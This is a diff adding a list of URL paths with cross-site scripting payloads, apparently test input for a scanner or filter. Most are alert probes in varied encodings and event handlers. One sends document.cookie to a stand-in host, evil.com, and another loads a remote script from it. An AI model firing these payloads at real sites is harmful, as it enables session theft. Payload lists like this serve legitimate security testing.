@@ -1,0 +1,25 @@
+/search?q=<script>alert('XSS')</script>
+/profile?name=<img src=x onerror=alert(1)>
+/home?message=Hello<body onload=alert('document.cookie')>
+/api/redirect?url=javascript:alert(document.domain)
+/search?query="><script>fetch('http://evil.com/?c='+document.cookie)</script>
+/user/settings?default_lang=<iframe src="javascript:alert('xss')"></iframe>
+/items?category=<svg onload=alert(1)>
+/comment/post/<img src=x onerror=prompt(1)>
+/index.php?page=<script src=http://evil.com/xss.js></script>
+/search?q=%3Cscript%3Ealert(1)%3C/script%3E
+/profile?bio=<a href="javascript:alert('XSS')">Click me</a>
+/api/v1/log?error=<details/open/ontoggle=alert('XSS')>
+/user?id=123<script>alert(1)</script>
+/set_cookie.php?value=<img src=1 onerror=alert(document.cookie)>
+/search?term=<body onpageshow="alert('xss')">
+/admin/dashboard?welcome_message=<h1 onclick="alert('XSS')">Welcome!</h1>
+/redirect?to=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+/search?keyword=" autofocus onfocus="alert('XSS')
+/page?content=<object data="javascript:alert(1)"></object>
+/api/v2/users?sort=<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+/contact_form?name=<video><source onerror="alert('xss')">
+/profile?avatar_url="><marquee onstart=alert(1)></marquee>
+/admin?module=Users&action=edit&id=1&name=<a onmouseover=alert(1)>admin</a>
+/#<img src=x onerror=alert('DOM XSS')>
+/search?q=<div onpointerover="alert(1)">Hover me</div>
